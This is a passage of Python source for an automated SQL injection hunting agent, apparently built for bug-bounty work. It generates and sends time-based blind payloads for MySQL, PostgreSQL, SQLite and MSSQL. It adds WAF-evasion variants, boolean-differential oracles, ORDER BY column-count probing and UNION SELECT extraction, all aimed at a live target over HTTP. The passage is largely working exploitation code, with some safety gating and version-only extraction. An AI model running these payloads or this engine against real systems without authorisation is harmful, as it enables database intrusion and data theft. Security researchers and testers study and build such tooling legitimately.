                f"Observation: Status={obs['status']}, Diff={obs['diff']}, "
                f"Latency={elapsed:.2f}s, Body={obs['body_snippet']}"
            )

        return f"Unknown action: {action}"

    async def should_stop(self, step: ThoughtStep) -> bool:
        """Check if we should stop."""
        # SGK-2026-0441 ⑤: a payout-grade PoC also stops the loop (additive;
        # all existing stop conditions are preserved).
        if self.vulnerable or self._payout_grade_obtained():
            return True

        if self._consecutive_blocked_observations >= 2:
            logger.info(
                "[%s] Early stop on param '%s' due to repeated blocked/error observations.",
                self.name,
                self.context.get("param"),
            )
            return True

        current_param = str(self.context.get("param", "")).strip().lower()
        target_lower = str(self.context.get("target", "")).lower()
        if current_param in self.CRITICAL_PARAM_HINTS:
            no_signal_limit = 5 if "sqli_blind" in target_lower else 4
        else:
            no_signal_limit = 3
        if self._no_signal_turns >= no_signal_limit and self._max_observed_latency < 2.0:
            logger.info(
                "[%s] Early stop on param '%s' due to repeated low-signal normal responses (limit=%d).",
                self.name,
                self.context.get("param"),
                no_signal_limit,
            )
            return True

        if step.action == "finish":
            return True
        return False

    def _payout_grade_obtained(self) -> bool:
        """SGK-2026-0441 ⑤: payout-grade PoC stop trigger (additive,
        fail-closed). True only when the candidate finding projected from
        this specialist's own captured-evidence state (PoC pair + impact +
        reproduction steps) is payout-grade. No candidate state -> False.
        """
        if not getattr(self, "_last_poc_request", "") or not getattr(self, "_last_poc_response", ""):
            return False
        from src.core.agents.swarm.injection.payout_grade import evaluate_payout_grade

        candidate = {
            "vuln_type": "sqli",
            "additional_info": {
                "poc_request": getattr(self, "_last_poc_request", ""),
                "poc_response": getattr(self, "_last_poc_response", ""),
            },
            "impact": str(getattr(self, "evidence", "") or ""),
            "reproduction_steps": [
                str(p) for p in (getattr(self, "used_payloads", None) or [])
            ],
        }
        try:
            return evaluate_payout_grade(candidate).payout_grade
        except Exception:  # noqa: BLE001 — fail closed, never stop on error
            return False

    def get_result(self) -> Dict[str, Any]:
        """Override to return SQLi-specific result."""
        return {
            "status": self.status.value,
            "turns": len(self.history),
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "payloads_used": self.used_payloads,
            "blind_correlation": self.last_blind_correlation,
        }

    def _looks_like_time_payload(self, payload: str) -> bool:
        payload_lower = str(payload or "").lower()
        markers = ["sleep(", "sleep ", "pg_sleep", "waitfor delay", "benchmark(", "dbms_lock.sleep"]
        return any(marker in payload_lower for marker in markers)

    def _estimate_expected_delay(self, payload: str) -> float:
        payload_text = str(payload or "")
        patterns = [
            r"sleep\s*\(\s*(\d+)\s*\)",
            r"pg_sleep\s*\(\s*(\d+)\s*\)",
            r"waitfor\s+delay\s+'0:0:(\d+)'",
            r"dbms_lock\.sleep\s*\(\s*(\d+)\s*\)",
        ]
        for pattern in patterns:
            match = re.search(pattern, payload_text, re.IGNORECASE)
            if match:
                try:
                    return max(1.0, float(match.group(1)))
                except (TypeError, ValueError):
                    continue
        return 5.0

    def _extract_oob_tokens(self, text: str) -> List[str]:
        if not text:
            return []
        pattern = re.compile(r"/(?:callback/)?([0-9a-fA-F]{8})(?:\b|/|\?)")
        tokens: List[str] = []
        for token in pattern.findall(str(text)):
            normalized = token.lower()
            if normalized not in tokens:
                tokens.append(normalized)
        return tokens

    def _build_blind_correlation(self, payloads_used: List[str]) -> Dict[str, Any]:
        time_based_confirmed = bool(self._time_signal_payload)
        expected_delay = self._estimate_expected_delay(self._time_signal_payload) if self._time_signal_payload else 0.0
        time_based = {
            "confirmed": time_based_confirmed,
            "payload": self._time_signal_payload,
            "expected_delay_seconds": round(expected_delay, 3) if expected_delay else 0.0,
            "observed_latency_seconds": round(self._time_signal_latency, 3) if self._time_signal_latency else 0.0,
            "max_observed_latency_seconds": round(self._max_observed_latency, 3) if self._max_observed_latency else 0.0,
        }
        if self._time_signal_timing_samples:
            time_based["timing_samples"] = dict(self._time_signal_timing_samples)

        oob_tokens: List[str] = []
        for payload in payloads_used or []:
            for token in self._extract_oob_tokens(str(payload)):
                if token not in oob_tokens:
                    oob_tokens.append(token)

        oob_hits: List[Dict[str, Any]] = []
        if oob_tokens:
            listener = get_oob_listener()
            for token in oob_tokens:
                interactions = listener.get_interactions(token)
                if not interactions:
                    continue
                oob_hits.append({
                    "token": token,
                    "count": len(interactions),
                    "paths": [i.path for i in interactions[:3]],
                })

        oob = {
            "tested_tokens": oob_tokens,
            "confirmed": bool(oob_hits),
            "hits": oob_hits,
        }

        return {
            "time_based": time_based,
            "oob": oob,
            "correlated": bool(time_based_confirmed and oob_hits),
        }

    async def _run_time_based_blind_precheck(self, param_name: str, baseline_value: Any) -> Dict[str, Any]:
        """
        Day 2強化: sqli_blind 向けに time-based payload を先行評価
        - DB別ペイロード対応（MySQL, PostgreSQL, SQLite, MSSQL）
        - WAF回避ペイロード対応（コメント挿入、エンコーディング）
        """
        baseline_payload = f"{param_name}={baseline_value}"
        baseline_observations: List[Dict[str, Any]] = []
        for _ in range(3):
            obs = await self._send_request(baseline_payload)
            if int(obs.get("status", 0) or 0) == 0:
                return {
                    "confirmed": False,
                    "payload": "",
                    "baseline_latency_seconds": 0.0,
                    "observed_latency_seconds": 0.0,
                    "latency_delta_seconds": 0.0,
                    "expected_delay_seconds": 0.0,
                    "technique": None,
                    "delivery_status": "baseline_not_delivered",
                }
            baseline_observations.append(obs)
        baseline_samples = [
            float(obs.get("elapsed_seconds", 0.0) or 0.0)
            for obs in baseline_observations
        ]
        baseline_elapsed = self._median_latency(baseline_samples)

        # Day 2強化: DB別Time-basedペイロード
        db_specific_payloads = self._generate_time_based_payloads(param_name)

        # Day 2強化: WAF回避ペイロード
        waf_evasion_payloads = self._generate_waf_evasion_payloads(param_name)

        # すべてのペイロードを統合
        all_candidates = db_specific_payloads + waf_evasion_payloads

        # まず基本ペイロードで試行
        for payload in all_candidates:
            obs = await self._send_request(payload)
            elapsed = float(obs.get("elapsed_seconds", 0.0) or 0.0)
            self._max_observed_latency = max(self._max_observed_latency, baseline_elapsed, elapsed)
            if int(obs.get("status", 0) or 0) == 0:
                continue

            latency_delta = elapsed - baseline_elapsed
            # Day 2強化: より厳密な閾値（3秒遅延を期待）
            expected_delay = self._estimate_expected_delay(payload)
            threshold = max(2.5, expected_delay * 0.8)  # 期待遅延の80%以上

            if elapsed >= threshold and latency_delta >= 2.0:
                positive_observations = [obs]
                for _ in range(2):
                    followup_obs = await self._send_request(payload)
                    if int(followup_obs.get("status", 0) or 0) == 0:
                        break
                    positive_observations.append(followup_obs)
                positive_samples = [
                    float(item.get("elapsed_seconds", 0.0) or 0.0)
                    for item in positive_observations
                ]
                inverse_obs = await self._send_request(baseline_payload)
                inverse_samples = [float(inverse_obs.get("elapsed_seconds", 0.0) or 0.0)]
                if len(positive_samples) < 3:
                    continue
                positive_median = self._median_latency(positive_samples)
                inverse_median = self._median_latency(inverse_samples)
                if positive_median < max(threshold, baseline_elapsed + 2.0):
                    continue
                if inverse_median > baseline_elapsed + max(1.0, expected_delay * 0.5):
                    continue

                self._time_signal_payload = payload
                self._time_signal_latency = positive_median
                self._time_signal_timing_samples = {
                    "baseline": [round(v, 3) for v in baseline_samples],
                    "sleep": [round(v, 3) for v in positive_samples],
                    "inverse_condition": [round(v, 3) for v in inverse_samples],
                }
                self._last_poc_request = str(obs.get("poc_request", "") or "")
                self._last_poc_response = str(obs.get("poc_response", "") or "")
                if payload not in self.used_payloads:
                    self.used_payloads.append(payload)
                return {
                    "confirmed": True,
                    "payload": payload,
                    "baseline_latency_seconds": round(baseline_elapsed, 3),
                    "observed_latency_seconds": round(positive_median, 3),
                    "latency_delta_seconds": round(positive_median - baseline_elapsed, 3),
                    "expected_delay_seconds": expected_delay,
                    "timing_samples": dict(self._time_signal_timing_samples),
                    "technique": self._detect_payload_technique(payload),
                }

        return {
            "confirmed": False,
            "payload": "",
            "baseline_latency_seconds": round(baseline_elapsed, 3),
            "observed_latency_seconds": 0.0,
            "latency_delta_seconds": 0.0,
            "expected_delay_seconds": 0.0,
            "technique": None,
        }

    @staticmethod
    def _median_latency(values: List[float]) -> float:
        if not values:
            return 0.0
        values_sorted = sorted(float(v) for v in values)
        mid = len(values_sorted) // 2
        if len(values_sorted) % 2:
            return values_sorted[mid]
        return (values_sorted[mid - 1] + values_sorted[mid]) / 2.0

    # Day 2強化: DB別Time-basedペイロード生成
    def _generate_time_based_payloads(self, param_name: str) -> List[str]:
        """データベース別のTime-basedペイロードを生成"""
        base_value = "1"
        payloads = []

        # MySQL/MariaDB
        mysql_payloads = [
            f"{param_name}={base_value}' AND SLEEP(3)-- -",
            f"{param_name}={base_value}' AND SLEEP(3)#",
            f"{param_name}={base_value} AND SLEEP(3)",  # 数値型
            f"{param_name}={base_value}' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",  # サブクエリ形式
            f"{param_name}={base_value}' AND IF(1=1, SLEEP(3), 0)-- -",  # 条件付き
            f"{param_name}={base_value}' AND BENCHMARK(1000000, MD5('test'))-- -",  # CPU負荷型
        ]

        # PostgreSQL
        pgsql_payloads = [
            f"{param_name}={base_value}' AND pg_sleep(3)-- -",
            f"{param_name}={base_value}' AND (SELECT pg_sleep(3))-- -",
            f"{param_name}={base_value} AND pg_sleep(3)",
            f"{param_name}={base_value}' AND CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- -",
        ]

        # SQLite（limited support）
        sqlite_payloads = [
            f"{param_name}={base_value}' AND randomblob(1000000000)-- -",  # CPU負荷型
            f"{param_name}={base_value} AND randomblob(1000000000)",
        ]

        # MSSQL
        mssql_payloads = [
            f"{param_name}={base_value}' WAITFOR DELAY '0:0:3'-- -",
            f"{param_name}={base_value}; WAITFOR DELAY '0:0:3'-- -",
        ]

        payloads.extend(mysql_payloads)
        payloads.extend(pgsql_payloads)
        payloads.extend(sqlite_payloads)
        payloads.extend(mssql_payloads)

        return payloads

    # Day 2強化: WAF回避ペイロード生成
    def _generate_waf_evasion_payloads(self, param_name: str) -> List[str]:
        """WAF回避用の難読化ペイロードを生成"""
        base_value = "1"
        payloads = []

        # コメント挿入
        comment_payloads = [
            f"{param_name}={base_value}'/**/AND/**/SLEEP(3)-- -",
            f"{param_name}={base_value}'/*test*/AND/*test*/SLEEP(3)#",
            f"{param_name}={base_value}' AND /*!50000SLEEP*/(3)-- -",  # MySQLバージョンコメント
        ]

        # エンコーディング変換
        encoded_payloads = [
            f"{param_name}={base_value}'%20AND%20SLEEP(3)-- -",  # URLエンコード
            f"{param_name}={base_value}'+AND+SLEEP(3)-- -",  # +エンコード
        ]

        # 改行/タブ挿入
        whitespace_payloads = [
            f"{param_name}={base_value}'%0aAND%0aSLEEP(3)-- -",  # 改行
            f"{param_name}={base_value}'%09AND%09SLEEP(3)-- -",  # タブ
        ]

        # 大文字小文字混在
        case_payloads = [
            f"{param_name}={base_value}' AND sLeEp(3)-- -",
            f"{param_name}={base_value}' AND SlEeP(3)#",
        ]

        payloads.extend(comment_payloads)
        payloads.extend(encoded_payloads)
        payloads.extend(whitespace_payloads)
        payloads.extend(case_payloads)

        return payloads

    # Day 2強化: ペイロード技術検出
    def _detect_payload_technique(self, payload: str) -> str:
        """使用されたペイロード技術を検出"""
        p = payload.lower()
        if "sleep(" in p or "pg_sleep(" in p:
            return "time_based_sleep"
        elif "benchmark(" in p:
            return "time_based_benchmark"
        elif "randomblob(" in p:
            return "time_based_randomblob"
        elif "waitfor" in p:
            return "time_based_waitfor"
        elif "/**/" in p or "/*!" in p:
            return "waf_evasion_comment"
        elif "%20" in p or "%0a" in p:
            return "waf_evasion_encoding"
        else:
            return "basic"

    @staticmethod
    def _firing_path_enabled() -> bool:
        """SGK-2026-0451: opt-in switch for the deterministic fire path.
        Default off -> existing behavior stays byte-identical."""
        try:
            from src.core.config.settings import get_settings
            return bool(getattr(get_settings(), "sqli_firing_path_enabled", False))
        except Exception:  # noqa: BLE001 — settings boundary, fail closed
            return False

    @staticmethod
    def _impact_demo_enabled() -> bool:
        """SGK-2026-0452: opt-in switch for the safe impact demonstration
        probe. Layered on the 0451 fire path — the probe only runs when the
        firing path is enabled AND the impact probe flag is on. Default off
        -> existing behavior stays byte-identical."""
        try:
            from src.core.config.settings import get_settings
            settings = get_settings()
            if not bool(getattr(settings, "sqli_firing_path_enabled", False)):
                return False
            return bool(getattr(settings, "sqli_impact_probe_enabled", False))
        except Exception:  # noqa: BLE001 — settings boundary, fail closed
            return False

    def _prioritize_candidate_params_generic(
        self,
        payload_params: Dict[str, Any],
        url_params_flat: Dict[str, Any],
    ) -> List[str]:
        """SGK-2026-0451: generic candidate ordering for the fire path.

        Excludes meta/noise params, then orders: params present in this
        url's own query string first, remaining candidates after. Generic
        across every discovered parameter — no product-specific name
        priority table (no curve fitting).
        """
        base = [
            name for name in list(payload_params.keys())
            if not self._is_excluded_param(name)
            and not self._is_non_attack_param(name)
            and not self._is_noise_param(name)
            # internal meta keys (defense in depth; normally already
            # filtered out of payload_params by the meta-keys filter)
            and str(name or "").strip().lower() not in {"url_evidence", "detection_mode"}
        ]
        ordered: List[str] = []
        for name in list(url_params_flat.keys()):
            if name in base and name not in ordered:
                ordered.append(name)
        for name in base:
            if name not in ordered:
                ordered.append(name)
        return ordered[: self.MAX_PARAMS_TO_TEST]

    @staticmethod
    def _build_error_based_probes(param_name: str, baseline_value: Any) -> List[str]:
        """SGK-2026-0451: basic error-based probes built on the baseline
        value (single/double quote). Generic across every discovered
        parameter; the adaptive LLM loop keeps full payload freedom."""
        base = str(baseline_value if baseline_value is not None else "1")
        if not base:
            base = "1"
        return [
            f"{param_name}={base}'",
            f'{param_name}={base}"',
        ]

    def _record_sql_observation(self, obs: Dict[str, Any], payload: str, diff_type: str) -> str:
        """SGK-2026-0451: record sql_error markers + evidence from one
        observed response. Shared by act() (LLM request) and
        _fire_error_based_probe() (deterministic first-fire) — the logic is
        byte-identical to the former act() request branch. Returns the
        classified error type ("" when none)."""
        error_classification = obs.get("error_classification", {})
        if not isinstance(error_classification, dict):
            error_classification = {}
        error_type = str(error_classification.get("type", "") or "").lower()
        status_code = int(obs.get("status", 0) or 0)
        if (not error_type or error_type == "none") and status_code > 0 and diff_type in {
            "error",
            "syntax",
            "schema",
            "data",
            "auth",
        }:
            error_type = diff_type if diff_type != "error" else "sql_error"
            error_classification = {
                "type": error_type,
                "details": "SQL error inferred from response differential",
            }
        if error_type and error_type != "none":
            self._sql_error_observed = True
            # SGK-2026-0452 A-1: pin THIS error observation's PoC pair; later
            # (successful) probes must never overwrite it — the evidence
            # chain (URL/status/body/payload) stays one coherent request.
            self._error_poc_request = str(obs.get("poc_request", "") or "")
            self._error_poc_response = str(obs.get("poc_response", "") or "")
            self._sql_error_evidence = {
                "error_type": error_type,
                "details": str(error_classification.get("details", "") or ""),
                "db_detection": obs.get("db_detection", {}),
                "body_snippet": str(obs.get("body_snippet", "") or ""),
                "payload": payload,
            }
            self._response_differential = {
                "attack_status": obs.get("status", 0),
                "attack_body_snippet": str(obs.get("body_snippet", "") or ""),
                "diff_type": diff_type,
            }
        return error_type

    async def _fire_error_based_probe(self, param_name: str, baseline_value: Any) -> str:
        """SGK-2026-0451: deterministic first-fire — send error-based probes
        to the discovered parameter via the existing _send_request (GET-only
        preserved), record probe_sent / poc_request / poc_response /
        sql_error markers through the same path as act(), and return a
        compact observation for the LLM loop. This is a firing guarantee
        only; the adaptive loop and payload breadth are unchanged."""
        lines = []
        for payload in self._build_error_based_probes(param_name, baseline_value):
            obs = await self._send_request(payload)
            self._probe_sent = True
            # SGK-2026-0451: record the fired payload like act() does, so
            # the 0449 evidence/impact fill (payload non-empty requirement)
            # works for fire-path findings too (recording only; the adaptive
            # loop and payload breadth are unchanged).
            if payload not in self.used_payloads:
                self.used_payloads.append(payload)
            if obs.get("poc_request"):
                self._last_poc_request = str(obs.get("poc_request", "") or "")
            if obs.get("poc_response"):
                self._last_poc_response = str(obs.get("poc_response", "") or "")
            diff_type = str(obs.get("diff", "")).lower()
            error_type = self._record_sql_observation(obs, payload, diff_type)
            status = int(obs.get("status", 0) or 0)
            snippet = str(obs.get("body_snippet", "") or "")[:160]
            lines.append(
                f"Probe {payload!r}: Status={status}, Diff={diff_type}, "
                f"ErrorType={error_type or 'none'}, Body={snippet}"
            )
        # SGK-2026-0452 (opt-in, layered on the 0451 fire path): the safe
        # impact demonstration probe runs ONLY after error-based firing
        # actually observed a SQL error on this parameter (fail-closed: no
        # sql_error observation -> no demonstration).
        if self._impact_demo_enabled() and self._sql_error_observed:
            await self._fire_impact_demonstration_probe(param_name, baseline_value)
        return "\n".join(lines)

    async def _send_demo_probe(self, payload: str) -> Dict[str, Any]:
        """SGK-2026-0452: send one impact-demonstration probe via the existing
        GET-only _send_request and record its payload (0449 fill requirement:
        payloads stay non-empty). Demonstration probes deliberately do NOT
        touch _last_poc_* / _error_poc_* / sql_error state — the pinned
        error-observation pair stays fixed (A-1)."""
        if payload not in self.used_payloads:
            self.used_payloads.append(payload)
        return await self._send_request(payload)

    @staticmethod
    def _quote_close_variants() -> List[str]:
        """SGK-2026-0452: finite generic set of quote/comment close variants.

        The injection point is a quoted literal; the family covers the common
        closing contexts around it: no extra parens ('), one paren (')), two
        parens (')). Every probe appends the comment '--' so a trailing
        template fragment (e.g. ")) AND deletedAt IS NULL") cannot break the
        statement. This is the ONLY shape vocabulary of the demonstration
        probes — no product-specific token is baked in; the variant that
        yields the first deterministic differential is adopted at runtime
        (the 1'))-family shapes measured on the real target are members of
        this family, not hardcoded shapes).
        """
        return ["'", "')", "'))"]

    @staticmethod
    def _boolean_condition_pairs() -> List[Tuple[str, str]]:
        """SGK-2026-0452: finite generic (true, false) condition pairs for
        the boolean differential oracle. OR pairs are tried first (they keep
        the statement well-formed regardless of the base match), then AND
        pairs — first deterministic differential wins."""
        return [("OR 1=1", "OR 1=2"), ("AND 1=1", "AND 1=2")]

    @staticmethod
    def _ordered_close_variants(preferred_close: str = "") -> List[str]:
        """SGK-2026-0452: close variants in probe order — the adopted close
        (when the boolean oracle already observed a differential with it)
        first, then the remaining family in canonical order (dedup)."""
        ordered: List[str] = []
        for close in (preferred_close, *SmartSQLiHunter._quote_close_variants()):
            if close and close not in ordered:
                ordered.append(close)
        return ordered

    @staticmethod
    def _union_padding_literals() -> List[str]:
        """SGK-2026-0452: finite generic padding literals used to align the
        UNION SELECT column count. NULL is the type-generic default (untyped
        in every supported DB, so UNION type coercion cannot fail); the
        numeric literal 1 is the fallback for apps that reject NULL-padded
        rows (measured on the real target: UNION rows with >=2 NULL columns
        are answered with an app-level 500 while literal padding returns
        the row). Both are plain SQL literals — no product-specific token."""
        return ["NULL", "1"]

    async def _fire_impact_demonstration_probe(
        self, param_name: str, baseline_value: Any
    ) -> None:
        """SGK-2026-0452 (opt-in, layered on the 0451 fire path): safe impact
        demonstration probe. Runs ONLY after error-based firing observed a
        real SQL error on this parameter (guard in _fire_error_based_probe)
        and only when sqli_impact_probe_enabled AND sqli_firing_path_enabled
        are on (fail-closed; default off -> byte-identical 0451).

        1. Boolean differential oracle: true/false conditional probes over the
           generic quote/comment close variant family
           (_quote_close_variants x _boolean_condition_pairs, comment '--'
           appended). The FIRST close/condition pair with a deterministic
           status / row-count / body-length difference is adopted and
           recorded as human-readable results; the adopted close is reused by
           the extraction below. No differential anywhere -> observed=False
           (fail-closed).
        2. Non-sensitive one-token extraction (generic ORDER BY column-count
           discovery over the same variant family + UNION SELECT carrying the
           DB version expression): the extraction is recorded ONLY when the
           version value actually appears in an observed response body. The
           expression is derived exclusively from _detect_database_type() via
           the closed non-sensitive mapping (_version_expr_for_db) — no user
           data / credentials / PII path.

        Fail-closed: unobserved clauses stay observed=False with empty values;
        the error_probe record (always present) pins the error observation's
        payload/status/marker so every status/URL in the impact is honestly
        attributed to its own request.
        """
        base = str(baseline_value if baseline_value is not None else "1")
        if not base:
            base = "1"
        see = self._sql_error_evidence
        if not isinstance(see, dict):
            see = {}
        rd = self._response_differential
        if not isinstance(rd, dict):
            rd = {}
        records: Dict[str, Any] = {
            "boolean_differential": {
                "observed": False,
                "true_probe": "",
                "true_result": "",
                "false_probe": "",
                "false_result": "",
            },
            "extraction": {
                "observed": False,
                "expr": "",
                "value": "",
                "probe": "",
                "response_excerpt": "",
            },
            "error_probe": {
                "payload": str(see.get("payload", "") or ""),
                "status": int(rd.get("attack_status", 0) or 0),
                "marker_excerpt": str(see.get("body_snippet", "") or ""),
            },
        }

        # --- 1. boolean differential oracle (true / false conditional) ---
        # Probe shape = generic quote/comment close variant family, tried in
        # canonical order; the FIRST close/condition pair with a deterministic
        # differential is adopted (fail-closed: no differential anywhere ->
        # observed=False). The adopted close is reused by the extraction.
        boolean_records, adopted_close = await self._run_boolean_oracle(
            param_name, base
        )
        records["boolean_differential"] = boolean_records

        # --- 2. non-sensitive one-token extraction (own fail-closed gates) ---
        records["extraction"] = await self._extract_non_sensitive_token(
            param_name, base, preferred_close=adopted_close
        )

        self._impact_probe_records = records
        logger.info(
            "[%s] Impact demonstration probe: boolean_observed=%s extraction_observed=%s",
            self.name,
            records["boolean_differential"]["observed"],
            records["extraction"]["observed"],
        )

    async def _run_boolean_oracle(
        self, param_name: str, base: str
    ) -> Tuple[Dict[str, Any], str]:
        """SGK-2026-0452: boolean differential oracle over the quote/comment
        close variant family.

        For each close variant in canonical order (_quote_close_variants) and
        each (true, false) condition pair (_boolean_condition_pairs), sends
        {base}{close} {cond} -- probes via the existing GET-only path and
        adopts the FIRST pair with a deterministic differential (status
        difference / JSON row-count difference / body-length difference >=16).
        Returns (records, adopted_close); the adopted close is reused by the
        column-count discovery and the UNION extraction. Fail-closed: no
        differential anywhere -> observed=False and adopted_close=""."""
        empty = {
            "observed": False,
            "true_probe": "",
            "true_result": "",
            "false_probe": "",
            "false_result": "",
        }
        for close in self._quote_close_variants():
            for true_cond, false_cond in self._boolean_condition_pairs():
                true_probe = f"{param_name}={base}{close} {true_cond} --"
                false_probe = f"{param_name}={base}{close} {false_cond} --"
                true_obs = await self._send_demo_probe(true_probe)
                false_obs = await self._send_demo_probe(false_probe)
                if self._has_boolean_differential(true_obs, false_obs):
                    return (
                        {
                            "observed": True,
                            "true_probe": true_probe,
                            "true_result": self._summarize_probe_result(true_obs),
                            "false_probe": false_probe,
                            "false_result": self._summarize_probe_result(false_obs),
                        },
                        close,
                    )
        return empty, ""

    async def _extract_non_sensitive_token(
        self, param_name: str, base: str, preferred_close: str = ""
    ) -> Dict[str, Any]:
        """SGK-2026-0452: generic non-sensitive one-token extraction.

        ORDER BY column-count discovery over the quote/comment close variant
        family (the close adopted by the boolean oracle is tried first), then
        UNION SELECT probes carrying the DB version expression at each column
        position, assembled with the adopted close:
        {param}=-1{close} UNION SELECT ... --  (-1 is the standard
        row-suppressing base so only the UNION row is returned; no user data
        is selected). Column alignment uses the finite padding literal family
        (_union_padding_literals: NULL first, literal 1 fallback) so apps
        that reject NULL-padded rows are still covered. observed=True ONLY
        when the version value actually appears in a response body and is not
        pre-existing app content (control check). The expression comes from
        the closed _version_expr_for_db mapping (DB metadata version functions
        only); unknown/unsupported DB or an unobserved value -> observed=False
        (fail-closed, extraction skipped).
        """
        empty = {
            "observed": False,
            "expr": "",
            "value": "",
            "probe": "",
            "response_excerpt": "",
        }
        db_detection = self._sql_error_evidence.get("db_detection", {})
        if not isinstance(db_detection, dict):
            db_detection = {}
        db_type = str(db_detection.get("type", "") or "").lower()
        expr = self._version_expr_for_db(db_type)
        if not expr:
            return empty
        pattern = self._version_value_pattern(db_type)
        if not pattern:
            return empty
        column_count, close = await self._discover_union_column_count(
            param_name, base, preferred_close=preferred_close
        )
        if column_count <= 0 or not close:
            return empty
        compiled = re.compile(pattern)
        # Control bodies: the version value must not pre-exist in the app's
        # own responses, nor appear from the injected close shape without the
        # UNION — otherwise the hit is not attributable to our probe.
        control_bodies = [
            str(obs.get("body_snippet", "") or "")
            for obs in (
                await self._send_demo_probe(f"{param_name}={base}"),
                await self._send_demo_probe(f"{param_name}=-1{close} --"),
            )
        ]
        for position in range(1, column_count + 1):
            for padding in self._union_padding_literals():
                exprs = [
                    expr if i == position else padding
                    for i in range(1, column_count + 1)
                ]
                probe = f"{param_name}=-1{close} UNION SELECT {', '.join(exprs)} --"
                obs = await self._send_demo_probe(probe)
                snippet = str(obs.get("body_snippet", "") or "")
                match = compiled.search(snippet)
                if not match:
                    continue
                value = match.group(0)
                if any(value in body for body in control_bodies):
                    continue
                return {
                    "observed": True,
                    "expr": expr,
                    "value": value,
                    "probe": probe,
                    "response_excerpt": snippet,
                }
        return empty

    async def _discover_union_column_count(
        self, param_name: str, base: str, preferred_close: str = ""
    ) -> Tuple[int, str]:
        """SGK-2026-0452: generic ORDER BY column-count discovery over the
        quote/comment close variant family (N=1..12).

        Tries each close variant in order (the close adopted by the boolean
        oracle first, when present) and returns (n, close) for the FIRST
        variant showing the classic deterministic transition: ORDER BY n is a
        clean response and ORDER BY n+1 shows a SQL error. (0, "") when no
        variant shows the transition -> extraction is skipped (fail-closed)."""
        for close in self._ordered_close_variants(preferred_close):
            prev_obs: Optional[Dict[str, Any]] = None
            for n in range(1, 14):  # probe N+1 to detect the 12-column boundary
                obs = await self._send_demo_probe(
                    f"{param_name}={base}{close} ORDER BY {n} --"
                )
                if (
                    prev_obs is not None
                    and not self._looks_like_sql_error_response(prev_obs)
                    and self._looks_like_sql_error_response(obs)
                ):
                    return n - 1, close
                prev_obs = obs
        return 0, ""

    @staticmethod
    def _version_expr_for_db(db_type: str) -> Optional[str]:
        """SGK-2026-0452: DB version expression for the non-sensitive token
        extraction, derived generically from _detect_database_type() results.
        This is the ONLY extraction mapping (values come from the closed
        NON_SENSITIVE_EXTRACTION_EXPRS set): unknown / unsupported DB ->
        None (skip extraction entirely)."""
        return {
            "sqlite": "sqlite_version()",
            "mysql": "version()",
            "postgresql": "version()",
            "mssql": "@@VERSION",
        }.get(str(db_type or "").strip().lower())

    @staticmethod
    def _version_value_pattern(db_type: str) -> Optional[str]:
        """SGK-2026-0452: regex locating the version expression's value in an
        observed body (version numbers look like X.Y.Z across the supported
        DBs). None for unsupported DB types (skip extraction)."""
        if SmartSQLiHunter._version_expr_for_db(db_type):
            return r"\d+\.\d+(?:\.\d+)+"
        return None

    @staticmethod
    def _looks_like_sql_error_response(obs: Dict[str, Any]) -> bool:
        """SGK-2026-0452: SQL error signal from one observed response — the
        diff classification, the error_classification, or HTTP >= 400."""
        diff = str(obs.get("diff", "") or "").lower()
        if diff in {"error", "syntax", "schema", "data", "auth"}:
            return True
        ec = obs.get("error_classification", {})
        if isinstance(ec, dict):
            ec_type = str(ec.get("type", "") or "").lower()
            if ec_type and ec_type != "none":
                return True
        status = int(obs.get("status", 0) or 0)
        return status >= 400

    @staticmethod
    def _count_json_rows(body: str) -> int:
        """SGK-2026-0452: generic row count from a JSON response body — a
        top-level array, or the first array value of a top-level object
        (e.g. {"data": [...]}). -1 when the body is not parseable JSON (no
        row signal)."""
        text = str(body or "").strip()
        if not text:
            return -1
        try:
            data = json.loads(text)
        except (TypeError, ValueError):
            return -1
        if isinstance(data, list):
            return len(data)
        if isinstance(data, dict):
            for value in data.values():
                if isinstance(value, list):
                    return len(value)
        return -1

    @staticmethod
    def _summarize_probe_result(obs: Dict[str, Any]) -> str:
        """SGK-2026-0452: human-readable observation summary, e.g.
        "HTTP 200, rows=8, body_len=1234". rows is included only when the
        body parsed as JSON (fail-closed: never claim unobserved rows)."""
        status = int(obs.get("status", 0) or 0)
        snippet = str(obs.get("body_snippet", "") or "")
        rows = SmartSQLiHunter._count_json_rows(snippet)
        if rows >= 0:
            return f"HTTP {status}, rows={rows}, body_len={len(snippet)}"
        return f"HTTP {status}, body_len={len(snippet)}"

    @staticmethod
    def _has_boolean_differential(
        true_obs: Dict[str, Any], false_obs: Dict[str, Any]
    ) -> bool:
        """SGK-2026-0452: deterministic differential between the true and
        false probes — HTTP status differs, or both JSON row counts parse and
        differ, or the observed body lengths differ by a non-trivial margin
        (>=16 bytes, far above payload reflection noise)."""
        t_status = int(true_obs.get("status", 0) or 0)
        f_status = int(false_obs.get("status", 0) or 0)
        if t_status != f_status:
            return True
        t_rows = SmartSQLiHunter._count_json_rows(
            str(true_obs.get("body_snippet", "") or "")
        )
        f_rows = SmartSQLiHunter._count_json_rows(
            str(false_obs.get("body_snippet", "") or "")
        )
        if t_rows >= 0 and f_rows >= 0 and t_rows != f_rows:
            return True
        t_len = len(str(true_obs.get("body_snippet", "") or ""))
        f_len = len(str(false_obs.get("body_snippet", "") or ""))
        return abs(t_len - f_len) >= 16

    async def _send_request(self, payload: str) -> Dict[str, Any]:
        """実際のリクエストを送信し、結果を返す"""
        param = self.context.get("param")
        target = self.context.get("target")
        method = self.context.get("method", "GET")
        auth_headers = self.context.get("auth_headers", {})
        params = self.context.get("params", {}).copy()

        # payload からパラメータ値を抽出
        # LLM は "id=1'" のように返す可能性があるが、param が既に分かっているので値のみを使用
        payload_value = payload
        if '=' in payload and payload.startswith(param + '='):
            # "id=1'" -> "1'" に変換
            payload_value = payload[len(param) + 1:]
            logger.debug(f"[{self.name}] Extracted payload value: '{payload_value}' from '{payload}'")

        if param and param in params:
            params[param] = payload_value

        try:
            start = time.perf_counter()
            if method == "POST":
                resp = await self.smart_client.request(
                    "POST",
                    target,
                    data=params,
                    headers=auth_headers,
                    timeout=60
                )
            else:
                parsed = urlparse(target)
                new_query = urlencode(params)
                new_url = urlunparse(parsed._replace(query=new_query))
                request_url = new_url

                resp = await self.smart_client.request(
                    "GET",
                    new_url,
                    headers=auth_headers,
                    timeout=60
                )

            # SmartRequest のレスポンスは辞書オブジェクト
            # resp = {"status": int, "body": str, "headers": dict, "error": str or None}
            body = resp.get("body", "")[:500] if resp.get("body") else ""
